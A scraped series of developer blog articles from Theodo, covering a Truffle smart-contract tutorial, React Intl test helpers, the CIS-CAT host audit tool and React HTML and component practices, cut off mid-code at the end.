structure\nWhat is interesting in the concept of blockchain is that we can store any kind of data with very high security. Data is stored inside a block that contains several elements:\n\nA hash\nThe hash of the previous block\nAn index (number of the block in the chain)\nA nonce (an integer that will be used during the mining process)\nA timestamp\nThe data\nA hash representing the data\n\nIf you are not familiar with the concept of hash, the important things to know are:\n\nFrom a very large departure set (typically infinite and very diverse), a hash function gives back a string of fixed length\nThe hash of a block is easy to calculate\nGiven a hash, it is impossible to build a message with this hash value\nIf you modify the message (even very slightly), you totally change the hash\nIt is almost impossible to find two messages with equal hash\n\nThe hash of a block is calculated by taking as argument the hash of the previous block, the index, the nonce, the timestamp, and a hash representing the data of the current block.\nAmong these inputs, the nonce will vary during the process of mining but of course the others stay fixed.\nBecause of the properties of a block, if you try to change the transactions/data inside a block, its hash will not be consistent with the data anymore (neither will be the previous hash of the next block).\nMining a block\nWhen a block is created, nodes of the network will try to mine it, which means to insert it into the blockchain.\nThe miner who succeeds will get a reward.\nProof of work\nIn order to mine a block, you have to find a valid hash for this block, but as you may remember a hash is quite easy to calculate.\nThats why you need to add a condition on the desired hash, typically a fixed number of zeros the hash must start with.\nThe proof-of-work enhances blockchain\u2019s security because of the considerable amount of calculation needed to modify a single block.\nTo conclude, a miner has to solve a time consuming mathematical problem to mine a block.\nThe nonce\nA nonce is an integer which will be incremented during the mining process.\nWithout a nonce, the data of a block is constant, and thus the hash function always returns the same result.\nIf your hash consists of hexadecimal characters, and you want to have a hash starting with 5 zeros you will have a probability of 1/1048576 to produce a hash verifying this condition with a random nonce.\nEach time you fail to get a hash verifying the condition, you can update the nonce and try again.\nThis assures that the miners of the network will have to work to add a block to the blockchain and thats why this algorithm is called proof of work.\nSmart Contracts\nSmart contracts have been introduced in the ethereum blockchain.\nThis is some code written inside the block of a blockchain that is able to execute a transaction if some conditions are fulfilled.\nIt is useful when the execution of a contract depends on some difficult conditions, or when you usually use a third-party to ensure the execution of the contract.\nInitializing the project\nIn this part we will write a smart contract using Solidity, the programming language used in the ethereum blockchain and Truffle; a development environment for Ethereum.\nWe will use Ganache (you can download it here which will give us access to a personal ethereum blockchain in order to test our smart-contracts and deploy them in a blockchain.\nFirst, lets install Truffle and initialize our project by running the following commands:\n\r\nnpm install -g truffle\r\nmkdir my-first-smart-contracts\r\ncd my-first-smart-contracts\r\ntruffle init\r\n\nThe truffle init command will provide the basic folders and files of your project:\n\ncontracts/\nmigrations/\ntest/\nbuild/\ntruffle.js\ntruffle-config.js\n\nYou can now open Ganache.\nYou will see 10 fake accounts that we can use and a local blockchain with only one initial block.\nYou can also see the port where your local blockchain runs. It should be by default HTTP://127.0.0.1:7545.\n\nLet\u2019s open your truffle.js file and modify it to connect it with the blockchain.\n\r\nmodule.exports = {\r\n    networks: {\r\n        development: {\r\n            host: 'localhost',\r\n            port: 7545,\r\n            network_id: '*'\r\n        }\r\n    }\r\n};\r\n\nOur first smart contract\nIn our contracts folder, we will create a basic smart contract Message.sol.\nIt will only enable us to write a message in the blockchain but it will be a good start to understand the way solidity works.\n\r\npragma solidity ^0.4.17;\r\n\r\ncontract Message {\r\n\r\n    bytes32 public message;\r\n\r\n    function setMessage(bytes32 newMessage) public {\r\n        message = newMessage;\r\n    }\r\n\r\n    function getMessage() public constant returns (bytes32) {\r\n        return message;\r\n    }\r\n}\r\n\nAs you can see, a contract looks like a regular class in another language.\nHowever, unlike a typical class, there is no this to access instance variables.\nThe state variables, like message here, can be read or written directly.\nSolidity is a typed language, you have to declare the types of the variables you create and specify the types of function arguments (like in setMessage) and returned values (like in getMessage)\nA call to setMessage will add a transaction to the blockchain and thus cost you gas because it modifies the state of the contract.\nGas is the amount you have to pay for running a transaction.\nThe miner can decide to increase or decrease the amount of gas according to its need.\nHowever you want to be able to access the value in the blockchain without spending gas, that\u2019s why we precise constant in getMessage declaration.\nYou may wonder why we used the type bytes32 and not string which exists in solidity.\nThe main reason is that writing to the ethereum blockchain costs ether.\nThe type string, being dynamically sized, is more expensive to use when writing data in the blockchain than the type bytes32.\nDeploying to the test blockchain\nOur contract being written, we now want to deploy it on the network.\nIn order to do this we have to write a migration file in javascript.\nIn the folder migrations/ let\u2019s create a new migration file called 2_message_migration.js.\nIt is important to write the \u20182\u2019 because Truffle will execute the migrations in the order of the prefix.\n\r\nvar Message = artifacts.require('./Message.sol');\r\nmodule.exports = function(deployer) {\r\n    deployer.deploy(Message);\r\n};\r\n\nThe artifacts.require method is similar to the require of node and will tell Truffle which contracts you want to interact with.\nThe name of the variable must match the name of your contract.\nThe deployer object gives you access to the deployment function.\nOur example is the easiest one.\nBack to the shell, we can now deploy our contract to the blockchain:\n\r\ntruffle compile\r\ntruffle migrate\r\n\nIn ganache you can now see new blocks automatically mined and corresponding to the deployment of your contract in your blockchain!\n\nInteracting with the contract\nThe contract being deployed on our local blockchain, we can now write our first transactions and see what happens.\nTo interact with the contract we can use directly the truffle console and write javascript in it or write a script and run it.\nIn this example we will interact directly in the console.\n\r\ntruffle console\r\nvar message;\r\nMessage.deployed().then(function(instance){message = instance;})\r\nmessage.setMessage(web3.fromAscii('Premier message !'));\r\n\nIf you go back to Ganache, you will see that a new block has been added to the blockchain, that\u2019s because setMessage is a transaction and modifies the state of our contract.\n\r\nmessage.getMessage().then(function(message){console.log(web3.toAscii(message));})\r\n\nFunctions from contract are promisified, that\u2019s why we use then to access the data. Moreover, as we used the type bytes32 to write our message, we have to add web3.fromAscii and web3.toAscii to write and read our message.\nThis last command should return the value of your message but if you look at your blocks in Ganache, you will not see any new blocks as this getter function did not modify the state of your contract.\nTesting a contract\nTruffle easily enables you to create tests for your contracts. It comes with its own assertion library which provides you classic test hooks beforeEach, afterEach, beforeAll, afterAll, and assertions equal, notEqual, isEmpty\u2026\n\r\nimport 'truffle/Assert.sol';\r\nimport 'truffle/DeployedAddresses.sol;\r\nimport '../contracts/Message.sol';\r\n\r\ncontract TestMessage {\r\n    function testSetMessage() {\r\n        Message messageContract = Message(DeployedAddresses.Message());\r\n        messageContract.setMessage('Hello World!');\r\n        bytes32 expected = bytes32('Hello World!');\r\n        Assert.equal(messageContract.getMessage(), expected, 'The message should be set');\r\n    }\r\n}\r\n\nThe contracts you deployed on the blockchain are available through the DeployedAddresses.sol library.\nIt is mandatory that your test contract and your test file start with \u2018Test\u2019, followed by the name of the contract.\nThe test being written you can now run it in the console:\n\r\ntruffle test\r\nUsing network 'development'.\r\n\r\nCompiling ./contracts/Message.sol...\r\nCompiling ./test/TestMessage.sol...\r\nCompiling truffle/Assert.sol...\r\nCompiling truffle/DeployedAddresses.sol...\r\nTestMessage\r\n\u2713 testSetMessage (55ms)\r\n\r\n1 passing (402ms)\r\n\nNext steps\nWe learnt how blockchain works and what a smart contract is but most importantly how to develop using the truffle environment thanks to a simple example.\nThe next step is to write one or more sophisticated contracts and build a web app to interact with them!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLouis Pinsard\r\n  \t\t\t\r\n  \t\t\t\tCurrently Web Developer at Theodo. Also very curious about AI, machine learning and blockchain.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy is it important?\nWhile programming on a project, you run your tests all the time, so it\u2019s important not to lose time analysing the results of your tests.\nWe want to immediatly spot which tests are failing, not being disturb by any flashing red false negative errors, which take all the place in your console and make you miss the important information.\nOn the project I\u2019m working on, the output of our tests was this kind of mess:\n\nThat\u2019s why we decided to create this standard on our project:\n\nIf my tests are passing, there must be no errors in the output of the test command\n\nSo we started to tackle this issue, and noticed that 100% of our errors in tests were either due to required props we forgot to pass to components, or errors from the React Intl library.\nI explain here how we managed to remove all these annoying React Intl errors from our tests:\n\nHow to avoid console errors from React-Intl?\nThe library complains that it does not know the translation for a message you want to render, because you did not pass them to the IntlProvider which wrap your components in your tests:\n\nconsole.error node_modules/react-intl/lib/index.js:706\n[React Intl] Missing message: \u201cLOGIN_USERNAME_LABEL\u201d for locale: \u201cen\u201d\nconsole.error node_modules/react-intl/lib/index.js:725\n[React Intl] Cannot format message: \u201cLOGIN_USERNAME_LABEL\u201d, using message id as fallback.\n\nThere are two ways to remove these errors.\n\n\nThe first one consists in explicitly giving the translations to the provider.\nIt has the benefit of writting the real translations in your shallowed components instead of the translation keys, which makes snapshots more readable.\nIt is easy to implement when you already have all your translations written in a file.\nHowever, it can be a bit tedious when your translations come from an API, because you have to update the list with the new translation every time you add a message.\n\n\nThe second solution works without having to update a list of translations, by automatically setting for every message a defaultMessage property equal to the message id.\nThis will not impact your snapshots: you will still have the message id and not its translation.\n\n\n1st solution: explicitly give the translations to your tests\n\nYou have to write all your translations in a JSON file, which looks like this:\n\n// tests/locales/en.json\r\n\r\n{\r\n  \"LOGIN_USERNAME_LABEL\": \"Username\",\r\n  \"LOGIN_PASSWORD_LABEL\": \"Password\",\r\n  \"LOGIN_BUTTON\": \"Login\",\r\n}\r\n\n\nEach time you mount or shallow a component, you should pass it as a messages props in the IntlProvider which wraps the component:\n\n// components/LoginButton/tests/LoginButton.test.js\r\n\r\nimport React from 'react';\r\nimport { IntlProvider } from 'react-intl';\r\n\r\nimport LoginButton from 'components/LoginButton';\r\nimport enTranslations from 'tests/locales/en.json';\r\n\r\nit('calls login function on click', () => {\r\n  const login = jest.fn();\r\n  const renderedLoginButton = mount(\r\n    <IntlProvider locale='en' messages={enTranslations}>\r\n      <LoginButton login={login} />\r\n    </IntlProvider>\r\n  );\r\n  renderedLoginButton.find('button').simulate('click');\r\n  expect(loginFunction.toHaveBeenCalled).toEqual(true);\r\n});\r\n\nBut actually, if you respect what is advised by React Intl documentation to shallow or mount components with Intl, you already have mountWithIntl and shallowWithIntl helper functions, and you pass your messages in the IntlProvider defined in these functions:\n// tests/helpers/intlHelpers.js\r\n\r\nimport React from 'react';\r\nimport { IntlProvider, intlShape } from 'react-intl';\r\nimport { mount, shallow } from 'enzyme';\r\n\r\nimport enTranslations from 'tests/locales/en.json';\r\n\r\n// You pass your translations here:\r\nconst intlProvider = new IntlProvider({\r\n    locale: 'en',\r\n    messages: enTranslations\r\n}, {});\r\n\r\nconst { intl } = intlProvider.getChildContext();\r\n\r\nfunction nodeWithIntlProp(node) {\r\n    return React.cloneElement(node, { intl });\r\n}\r\n\r\nexport function shallowWithIntl(node, { context } = {}) {\r\n    return shallow(\r\n        nodeWithIntlProp(node),\r\n        {\r\n            context: Object.assign({}, context, { intl }),\r\n        }\r\n    );\r\n}\r\n\r\nexport function mountWithIntl(node, { context, childContextTypes } = {}) {\r\n    return mount(\r\n        nodeWithIntlProp(node),\r\n        {\r\n            context: Object.assign({}, context, { intl }),\r\n            childContextTypes: Object.assign({},\r\n                { intl: intlShape },\r\n                childContextTypes\r\n            )\r\n        }\r\n    );\r\n}\r\n\nAnd you can use these functions instead of mount and shallow:\n// components/LoginButton/tests/LoginButton.test.js\r\n\r\nimport React from 'react';\r\n\r\nimport LoginButton from 'components/LoginButton';\r\nimport { mountWithIntl } from 'tests/helpers/intlHelpers';\r\nimport enTranslations from 'tests/locales/en.json';\r\n\r\nit('calls login function on click', () => {\r\n  const login = jest.fn();\r\n  const renderedLoginButton = mountWithIntl(<LoginButton login={login} />);\r\n  renderedLoginButton.find('button').simulate('click');\r\n  expect(loginFunction.toHaveBeenCalled).toEqual(true);\r\n});\r\n\n2nd solution: pass a customized intl object to your shallowed and mounted components\nUnlike the previous one, this solution works without having to update a list of translations, by using a customized intl object in your tests.\nCustomize the intl object\nThe idea is to modify the formatMessage method which is in the intl object passed to your component.\nYou have to make this formatMessage automatically add a defaultMessage property to a translation which does not already have one, setting its value the same as the translation id.\nIf we call originalIntl the intl object before customizing it, here is how you can do it:\nconst intl = {\r\n  ...originalIntl,\r\n  formatMessage: ({ id, defaultMessage }) =>\r\n    originalIntl.formatMessage({\r\n        id,\r\n        defaultMessage: defaultMessage || id\r\n    }),\r\n};\r\n\nHow to use this customized intl in your tests\nAs in the previous solution, we\u2019re going to modify the intlHelpers that React Intl documentation advise to use in tests.\nThe idea is to modify the two helper functions mountWithIntl and shallowWithIntl to give to the component our custom intl object instead of the original one.\nIn order to make the defaultMessage properties taken into account, you also have to give a defaultLocale props to the IntlProvider, with the same value as the locale props.\nHere is the modified intlHeplers file:\n// tests/helpers/intlHelpers.js\r\n\r\nimport React from 'react';\r\nimport { IntlProvider, intlShape } from 'react-intl';\r\nimport { mount, shallow } from 'enzyme';\r\n\r\nimport enTranslations from 'tests/locales/en.json';\r\n\r\n// You give the default locale here:\r\nconst intlProvider = new IntlProvider({\r\n    locale: 'en',\r\n    defaulLocale: 'en'\r\n}, {});\r\n\r\n// You customize the intl object here:\r\nconst { intl: originalIntl } = intlProvider.getChildContext();\r\nconst intl = {\r\n  ...originalIntl,\r\n  formatMessage: ({ id, defaultMessage }) =>\r\n    originalIntl.formatMessage({\r\n        id,\r\n        defaultMessage: defaultMessage || id\r\n    }),\r\n};\r\nfunction nodeWithIntlProp(node) {\r\n    return React.cloneElement(node, { intl });\r\n}\r\n\r\nexport function shallowWithIntl(node, { context } = {}) {\r\n    return shallow(\r\n        nodeWithIntlProp(node),\r\n        {\r\n            context: Object.assign({}, context, { intl }),\r\n        }\r\n    );\r\n}\r\n\r\nexport function mountWithIntl(node, { context, childContextTypes } = {}) {\r\n    return mount(\r\n        nodeWithIntlProp(node),\r\n        {\r\n            context: Object.assign({}, context, { intl }),\r\n            childContextTypes: Object.assign({},\r\n                { intl: intlShape },\r\n                childContextTypes\r\n            )\r\n        }\r\n    );\r\n}\r\n\nThen, you only have to use these functions instead of mount and shallow and all the warnings from React Intl will disappear from your shell.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tYannick Wolff\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tTL;DR: try this security tool it\u2019s awesome.\nI was\u00a0looking for best practices to secure docker applications. One of those best pratices is to make sure the host is secured and well configured.\u00a0The main advice was\u00a0to read the best pratices from\u00a0the Center for Internet Security. This organisation\u00a0provides very actionnable recommandations on how to secure your OS.\u00a0It also\u00a0produces a very nice tool (which require java) that you run on the\u00a0server you want to\u00a0check.\u00a0This tool generates a\u00a0detailled report\u00a0describing\u00a0all the security flaws and their fixes.\nTesting\u00a0the CIS tool on your Vagrant\nYou can quickly test it\u00a0locally on your Vagrant\u00a0following those steps:\n\nInstall java on your Vagrant. If you use Ansible provisioning you can use this role\nAfter downloading the\u00a0tool,\u00a0extract the files and move it\u00a0to your Vagrant\nEnable the SSH X11 forwarding\u00a0for your Vagrant\nSSH into your vagrant and run the program.\u00a0If your server is a Linux one,\u00a0\u00a0run with sudo rights `CIS-CAT.sh`\nSelect \u201cserver 2\u201d option to have a complete report\n\nStart the check of the OS. You should see something like this:\n\nYou are done. To have an example of what you can get,\u00a0see the report I got for my side project. Here is the scoring part\u00a0of the report:\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIf you ever used React you may have noticed that you can easily forget how to write a static webpage because it adds a layer of abstraction that changes the way the page is created. But in the end, all code written in JSX will generate a classic DOM. In this article I\u2019ll show you\u00a0mistakes I made and why it is important to write good HTML in Single Page Apps.\n\u00a0\nThe unresponsive file input\nContext\u00a0: Creating a button to upload files on a website.\nHow we did it:\nWe used a <input type=\"file\"> HTML input. Then we added an eventListener\u00a0 onChange\u00a0 which called a handleChange function \u00a0that adds the uploaded file as a base64 in component\u2019s state. Then, to delete it, we binded a function removeUploadedFile on click of a button and the file was removed from the list of uploaded file in the state. This is the natural \u201cReact way\u201d to create the feature.\n\r\nclass UploadButton extends Component {\r\n\u00a0\u00a0handleButtonCLick = () => {\r\n\u00a0\u00a0\u00a0\u00a0this.refs.fileUploader.click();\r\n\u00a0\u00a0}\r\n\u00a0\r\n\u00a0\u00a0handleChange = (event) => {\r\n\u00a0\u00a0\u00a0\u00a0this.props.handleFileUpload(event);\r\n\u00a0\u00a0}\r\n\u00a0\r\n\u00a0\u00a0render() {\r\n\u00a0\u00a0\u00a0\u00a0return (\r\n\u00a0\r\n      <div style={styles.container} onClick={this.handleButtonCLick} >\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0<input type=\"file\" onChange={this.handleChange} style={styles.input} accept={acceptedFileTypesForUpload.join(',')} />\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0<AddIcon color={COLORS.BLUE} style={styles.icon} />\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</div>\r\n\u00a0\r\n\u00a0\u00a0\u00a0\u00a0);\r\n\u00a0\u00a0}\r\n}\r\n\nWhat went wrong\u00a0:\nWe noticed that sometimes, uploading a document had no effect on our component\u2019s state. We had to spend some time to reproduce the bug\u00a0: It happened when we added a document, then immediately removed it and added it again. During the last step, the document was not added to the state.\nWhat happened :\nThe chosen implementation focuses only on the React mechanisms and does not take into account the underlying HTML. Indeed, any HTML input file has a value property associated with it that contains the information of the last document added in the input. But our implementation was only concerned with updating the React state of our component without taking care of this property.\nSo, when a document was removed, it was taken off the list in the state but not from the \u201cvalue\u201d property of the input. If we tried to add it again, the value parameter of the input did not change since the doc was already there and the onChange was not triggered.\n\r\nclass UploadButton extends Component {\u00a0\r\n\u00a0\u00a0handleChange = (event) => {\r\n\u00a0\u00a0\u00a0\u00a0this.props.handleFileUpload(event);\r\n    this.refs.fileUploader.value = ''; // this fixed the bug\r\n\n\u00a0\nEveryone hits Enter to submit a form\nContext\u00a0: An authentication form that is not submitted by pressing \u201cEnter\u201d key.\nHow we did it:\nWe used two TextField from the library MaterialUI to request username and password and a button to validate. The button had an onClick property that calls a function which triggers an API call to connect the user.\n\r\nrender() {\r\n    return (\r\n        <div>\r\n          <TextField\r\n              id=\"username\"\r\n          />\r\n          <TextField\r\n              id=\"password\"\r\n              type=\"password\"\r\n          />\r\n          <button onClick={this.submitForm}>\r\n              Submit\r\n          </button>\r\n        </div>\r\n    );\r\n}\r\n\nWhat happened :\nHere too, \u00a0using functions of React component called through event listener bypassed the usual way in which a form must be built in HTML ie with <form> tags and a <input type=submit> in the end. This was the right way to create our login form :\n\r\nrender() {\r\n    return (\r\n        <form onSubmit={this.submitForm}>\r\n            <TextField\r\n                id=\"text-field-default\"\r\n                defaultValue=\"Default Value\"\r\n            />\r\n            <input type=\"submit\" value=\"Submit\" />\r\n        </form>\r\n    );\r\n}\r\n\nThus usual features (such as validation with input) are missing. It is possible to reinvent them for example with a KeyEventListener here, but what is the point then\u00a0?\n\u00a0\nKeep the web semantic!\nContext\u00a0: Reproduce a button by adding an onClick property on a div for example\nThe problem that arises in this case is that the semantic web is not respected. The semantic web is a set of standards that allow search engines to transform textual information (HTML pages) into machine-readable data.\nIn this context a <div> tag will be interpreted as an element that contains information and not as an interface element. Thus, using a div tag as a button distorts search engine interpretation and therefore SEO.\nHere are some examples of what you should and shouldn\u2019t do:\n\r\n\u274c <div onClick=\"function\">Button</div>\r\n\u2705 <button onClick=\"function\">Button</button>\r\n\r\n\u274c <div onClick=\"function\">Link</div>\r\n\u2705 <a href=\"link\">Link</a>\r\n\r\n\u274c <div style=\"list\">\r\n    <div style=\"list-elem\">1</div>\r\n    <div style=\"list-elem\">2</div>\r\n   </div>\r\n\u2705 <ul style=\"list\">\r\n    <li style=\"list-elem\">1</li>\r\n    <li style=\"list-elem\">2</li>\r\n   </ul>\r\n\nAn other frequent mistake comes from the React obligation to enclose components in a unique HTML tag. <div> tags are often added to the DOM structure for no other reason. To prevent that, React introduced Fragments in version v16.2.0. These allow to group many childs in a component without adding an extra tag :\n\r\nrender() {\r\n  return (\r\n    <React.Fragment>\r\n      <li />\r\n      <li />\r\n      <li />\r\n    </React.Fragment>\r\n  );\r\n}\r\n\nIt is even possible to write shorter Fragments tags like this (not supported by all tools)\n\r\nrender() {\r\n  return (\r\n    <>\r\n      <li />\r\n      <li />\r\n      <li />\r\n    </>\r\n  );\r\n}\r\n\n\u00a0\nConclusion\nAs you can see there are many reason for writing good HTML and it is also very important for one (often forgotten) reason : accessibility.\nAccessibility refers to the possibility for people with disabilities to read, understand, navigate and interact with your website. And\u00a0many features around accessibility (tab navigation, ARIA) are actually based on HTML features. If all your React components are enclosed in useless HTML tags, you\u2019ll turn tab navigation into hell for your disabled users.\nA good start the tackle these issues is to install linters like eslint which provide plugins for accessibility: eslint-plugin-jsx-a11y. React is a very powerful tool, but don\u2019t forget the basics!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tElie Dutheil\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhat is the perfect React component?\n\nThe component should have one purpose only, rendering\nThe component should be small and easily understandable\nThe component should rerender only if needed\n\nHow to create the perfect React component?\n\nLogic Functions\nAtomic Design\nSelectors and Reselectors\nFunctions inside render\n\nLogic Functions\n\nExport your logic functions to an external service\n\nFunctions other than lifecycle methods should only return JSX objects\nLogic functions can then be easily reused in other components\nLogic functions can then be unit tested\nComponent is easy to read\n\n\n\nBad Example\n// MyComponent.js\r\nexport default class MyComponent extends PureComponent {\r\n   computeAndDoStuff = prop1, prop2 => {\r\n      // Logic that returns something depending on the props passed\r\n   }\r\n\r\n   render() {\r\n      <div>\r\n         {this.computeAndDoStuff(this.props.prop1, this.props.prop2) && <span>Hello</span>}\r\n      </div>\r\n   }\r\n}\r\n\r\nMyComponent.propTypes = {\r\n   prop1,\r\n   prop2,\r\n}\r\n\r\nconst mapStateToProps = state => {\r\n   prop1: state.object.prop1,\r\n   prop2: state.object.prop2,\r\n}\r\n\r\nexport const MyComponentContainer = connect(mapStateToProps)(MyComponent)\r\n\n\n\u2717 Component is doing more than just rendering, it is doing logic inside\n\u2717 Component needs multiple snapshots to test the logic of the function\n\nGood Example\n// MyComponent.js\r\nimport { computeAndDoStuff } from '@services/computingService'\r\n\r\nexport default class MyComponent extends PureComponent {\r\n   render() {\r\n      <div>\r\n         {computeAndDoStuff(this.props.prop1, this.props.prop2) && <span>Hello</span>}\r\n      </div>\r\n   }\r\n}\r\n\r\nMyComponent.propTypes = {\r\n   prop1,\r\n   prop2,\r\n}\r\n\r\nconst mapStateToProps = state => {\r\n   prop1: state.object.prop1,\r\n   prop2: state.object.prop2,\r\n}\r\n\r\nexport const MyComponentContainer = connect(mapStateToProps)(MyComponent)\r\n\n// computingService.js\r\nexport computeAndDoStuff = prop1, prop2 => {\r\n   // Logic that returns something depending on the props passed\r\n}\r\n\n\n\u2714\ufe0e Component has only one role, render\n\u2714\ufe0e Component needs only 2 snapshots, depending on if the result of the function is true or false\n\u2714\ufe0e Function can be unit tested directly from the service, without involving the component\n\nAtomic Design\n\nFollow the \u201cAtomic Design Methodology\u201d\n\nComponents will be small enough (200 lines max) to be easily understandable\nComponents can be found easily and the architecture is straightforward for newcomers\n\n\n\nBad Example\n// MyPage.js\r\nimport { MyComponent1, MyComponent2, MyField1, Myfield2 } from '@components'\r\n\r\nexport default class MyPage extends PureComponent {\r\n   render() {\r\n      <div>\r\n         <MyComponent1 />\r\n         <div>\r\n            <MyField1 />\r\n            <MyField2 />\r\n            <MyField1 disabled />\r\n            <MyField2 color={'blue'} />\r\n         </div>\r\n         <MyComponent2 />\r\n      </div>\r\n   }\r\n}\r\n\r\nexport const MyPageContainer = connect(mapStateToProps)(MyPage)\r\n\n\n\u2717 Components are all coming from the same folder\n\u2717 If the page needs to be modified, new components will be created in the same folders without thinking of refactoring\n\u2717 Component may end up being really long\n\u2717 The structure of the page is not easily understandable\n\nGood Example\n// MyPage.js\r\nimport { MyOrganism1, MyOrganism2, MyOrganism3 } from '@organisms'\r\n\r\nexport default class MyPage extends PureComponent {\r\n  render() {\r\n     <div>\r\n        <MyOrganism1 />\r\n        <MyOrganism2 />\r\n        <MyOrganism3 />\r\n     </div>\r\n  }\r\n}\r\n\n// MyOrganism1.js\r\nimport { MyMolecule1, MyMolecule2 } from '@molecules'\r\n\r\nexport default class MyOrganism1 extends PureComponent {\r\n  render() {\r\n     <div>\r\n        <MyMolecule1 />\r\n        <MyMolecule2 />\r\n     </div>\r\n  }\r\n}\r\n\n// MyMolecule1.js\r\nimport { MyAtom1, MyAtom2 } from '@atoms'\r\n\r\nexport default class MyMolecule1 extends PureComponent {\r\n  render() {\r\n     <div>\r\n        <MyAtom1 />\r\n        <MyAtom2 />\r\n     </div>\r\n  }\r\n}\r\n\n\n\u2714\ufe0e Page Component structure is understandable at first sight\n\u2714\ufe0e When working on the Page again, it is easy to see if some components can be reused\n\u2714\ufe0e For a new developer, it is easy to understand right away\n\u2714\ufe0e Components stay small and easily testable\n\nSelectors and Reselectors\n\nUse selectors and reselectors\n\nComponents will handle only a few props (10 props max) to be easily understandable\nComponents will be completely decoupled from the shape of the store\nPerformance will be increased in case of computed derived data, thanks to reselectors memoisation\nSelectors and reselectors can be easily tested\n\n\n\nBad Example\n// Table.js\r\nimport ...\r\n\r\nexport default class Table extends PureComponent {\r\n   constructor(props) {\r\n      super(props)\r\n      this.renderTable = this.renderTable.bind(this)\r\n      this.calculateNewProps(...props)\r\n   }\r\n   \r\n   componentWillUpdate(nextProps) {\r\n      this.calculateNewProps(...nextProps)\r\n   }\r\n   \r\n   calculateNewProps = (prop1, prop2, ..., prop15) => {\r\n      // Logic that modifies the store for the table rendering\r\n   }\r\n   \r\n   renderTable() {\r\n      // Return JSX based on props\r\n   }\r\n\r\n   render() {\r\n      this.renderTable()\r\n   }\r\n}\r\n\r\nTable.propTypes = {\r\n   prop1,\r\n   prop2,\r\n   ...\r\n   prop15,\r\n}\r\n\r\nconst mapStateToProps = state => {\r\n   prop1: state.object.prop1, \r\n   prop2: state.object.prop2,\r\n   ...\r\n   prop15: state.object.prop15,\r\n}\r\n\r\nexport const TableContainer = connect(mapStateToProps)(Table)\r\n\n\n\u2717 Component has too many props, it is really dependent on the store shape\n\u2717 Component is too long (was 300+)\n\u2717 Component is updating the store in its own lifecycle, which can cause race conditions\n\nGood Example\n// Table.js\r\nimport ...\r\nimport { getTableRows } from '@selectors'\r\n\r\nexport default class Table extends PureComponent {\r\n   renderTable() {\r\n      // Return JSX based on rows\r\n   }\r\n\r\n   render() {\r\n      this.renderTable()\r\n   }\r\n}\r\n\r\nTable.propTypes = {\r\n   tableRows,\r\n}\r\n\r\nconst mapStateToProps = state => {\r\n   tableRows: getTableRows(state),\r\n}\r\n\r\nexport const TableContainer = connect(mapStateToProps)(Table)\r\n\n// selectors.js\r\nimport { createSelector } from 'reselect'\r\n\r\nexport const getTableRows = createSelector(\r\n   getProp1,\r\n   getProp2,\r\n   ...,\r\n   getProp15,\r\n   (prop1, prop2, ..., prop15) => {\r\n      // logic to return the table rows based on the props in the store\r\n   }\r\n)\r\n\n\n\u2714\ufe0e Component is completely decoupled from stores shape\n\u2714\ufe0e Component does not have any logic, its job is to render objects\n\u2714\ufe0e Component is easy to read or revisit\n\u2714\ufe0e Selector (data formatting) can be easily tested!\n\nFunctions inside render\n\nNever create functions into the render(), use arrow functions\n\nFunctions defined into onClick or onChange methods will be recreated every time the action is triggered, causing rerendering and performance impact\nComponent will not rerender if the arrow function is defined outside of the render()\nArrow function have access to this without needing to be bound in the constructor\n\n\n\nBad Example\n// MyPage.js\r\nimport doSomething from '@services'\r\n\r\nexport default class MyPage extends PureComponent {\r\n   render() {\r\n      <div>\r\n         <Button onClick={() => doSomething(this.props.param))} />\r\n      </div>\r\n   }\r\n}\r\n\r\nMyPage.propTypes = {\r\n   param,\r\n}\r\n\n\n\u2717 Function is defined inside the render, a new instance will be created even if the props do not change\n\u2717 Performance loss\n\nGood Example\n// MyPage.js\r\nimport doSomething from '@services'\r\n\r\nexport default class MyPage extends PureComponent {\r\n   onClick = () => doSomething(this.props.param)\r\n\r\n   render() {\r\n      <div>\r\n         <Button 